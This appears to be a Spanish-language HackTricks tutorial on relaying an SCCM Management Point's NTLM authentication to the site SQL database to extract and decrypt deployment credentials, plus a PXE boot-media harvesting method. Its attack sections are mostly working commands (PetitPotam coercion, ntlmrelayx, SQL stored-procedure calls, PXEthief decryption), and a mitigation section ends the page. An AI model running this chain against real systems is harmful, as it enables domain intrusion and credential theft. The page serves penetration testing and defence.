# SCCM Management Point NTLM Relay to SQL – Extracción de secretos de políticas OSD

{{#include ../../banners/hacktricks-training.md}}

## Resumen
Forzando a un **System Center Configuration Manager (SCCM) Management Point (MP)** para que se autentique vía SMB/RPC y **relayeando** esa cuenta máquina NTLM hacia la **site database (MSSQL)** obtienes los permisos `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Estos roles te permiten invocar un conjunto de stored procedures que exponen blobs de políticas de **Operating System Deployment (OSD)** (credenciales del Network Access Account, variables de Task-Sequence, etc.). Los blobs están codificados/encriptados en hex pero pueden decodificarse y desencriptarse con **PXEthief**, obteniendo los secretos en texto plano.

Cadena de alto nivel:
1. Descubrir MP y site DB ↦ endpoint HTTP no autenticado `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Iniciar `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Forzar al MP usando PetitPotam, PrinterBug, DFSCoerce, etc.
4. A través del proxy SOCKS conéctate con `mssqlclient.py -windows-auth` como la cuenta reenviada **<DOMAIN>\\<MP-host>$**.
5. Ejecutar:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (o `MP_GetPolicyBodyAfterAuthorization`)
6. Quitar BOM `0xFFFE`, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Secretos como `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc. se recuperan sin tocar PXE ni los clientes.

---

## 1. Enumeración de endpoints MP no autenticados
La extensión ISAPI del MP **GetAuth.dll** expone varios parámetros que no requieren autenticación (a menos que el sitio sea PKI-only):

| Parámetro | Propósito |
|-----------|-----------|
| `MPKEYINFORMATIONMEDIA` | Devuelve la clave pública del certificado de firma del sitio + GUIDs de dispositivos *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Lista todos los Management-Point en el sitio. |
| `SITESIGNCERT` | Devuelve el certificado de firma del Primary-Site (identifica el servidor del sitio sin LDAP). |

Obtén los GUIDs que actuarán como el **clientID** para consultas a la BD posteriores:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Relay la cuenta de equipo MP a MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Cuando la coercion se active deberías ver algo como:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identificar políticas OSD a través de procedimientos almacenados
Conéctese a través del proxy SOCKS (puerto 1080 por defecto):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Cambie a la base de datos **CM_<SiteCode>** (utilice el código de sitio de 3 dígitos, p. ej. `CM_001`).

### 3.1 Encontrar GUIDs de Unknown-Computer (opcional)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Listar políticas asignadas
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Cada fila contiene `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Enfócate en las políticas:
* **NAAConfig**  – credenciales de Network Access Account
* **TS_Sequence** – variables de Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – Puede contener cuentas run-as

### 3.3  Recuperar el Body completo
Si ya tienes `PolicyID` y `PolicyVersion` puedes omitir el requisito de clientID usando:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANTE: En SSMS aumente “Maximum Characters Retrieved” (>65535) o el blob será truncado.

---

## 4. Decodificar y descifrar el blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Ejemplo de secretos recuperados:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Roles y procedimientos SQL relevantes
Tras el relay, el login se mapea a:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Estos roles exponen docenas de permisos EXEC; los principales usados en este ataque son:

| Procedimiento almacenado | Propósito |
|-------------------------|-----------|
| `MP_GetMachinePolicyAssignments` | Lista las políticas aplicadas a un `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Devuelve el cuerpo completo de la política. |
| `MP_GetListOfMPsInSiteOSD` | Devuelto por la ruta `MPKEYINFORMATIONMEDIA`. |

Puedes inspeccionar la lista completa con:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE boot media harvesting (SharpPXE)
* **PXE reply over UDP/4011**: enviar una solicitud de arranque PXE a un Distribution Point configurado para PXE. La respuesta proxyDHCP revela rutas de arranque como `SMSBoot\\x64\\pxe\\variables.dat` (encrypted config) y `SMSBoot\\x64\\pxe\\boot.bcd`, además de un posible blob de clave cifrada.
* **Retrieve boot artifacts via TFTP**: usar las rutas devueltas para descargar `variables.dat` vía TFTP (sin autenticación). El archivo es pequeño (unos pocos KB) y contiene las variables de medios cifradas.
* **Decrypt or crack**:
- Si la respuesta incluye la clave de desencriptado, pásala a **SharpPXE** para descifrar `variables.dat` directamente.
- Si no se proporciona clave (PXE media protegida por una contraseña personalizada), SharpPXE emite un hash **Hashcat-compatible** `$sccm$aes128$...` para cracking offline. Tras recuperar la contraseña, descifrar el archivo.
* **Parse decrypted XML**: las variables en texto plano contienen metadata de despliegue SCCM (**Management Point URL**, **Site Code**, GUIDs de medios y otros identificadores). SharpPXE las parsea e imprime un comando listo para ejecutar de **SharpSCCM** con los parámetros GUID/PFX/site precargados para abuso posterior.
* **Requirements**: solo necesitan conectividad de red al listener PXE (UDP/4011) y TFTP; no se requieren privilegios de admin local.

---

## 7. Detection & Hardening
1. **Monitor MP logins** – cualquier cuenta de equipo MP que inicie sesión desde una IP que no sea su host ≈ relay.
2. Habilitar **Extended Protection for Authentication (EPA)** en la base de datos del sitio (`PREVENT-14`).
3. Deshabilitar NTLM no usado, aplicar SMB signing, restringir RPC (mismas mitigaciones usadas contra `PetitPotam`/`PrinterBug`).
4. Endurecer la comunicación MP ↔ DB con IPSec / mutual-TLS.
5. **Limitar la exposición PXE** – filtrar UDP/4011 y TFTP a VLANs de confianza, requerir contraseñas PXE, y alertar sobre descargas TFTP de `SMSBoot\\*\\pxe\\variables.dat`.

---

## See also
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## References
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
{{#include ../../banners/hacktricks-training.md}}
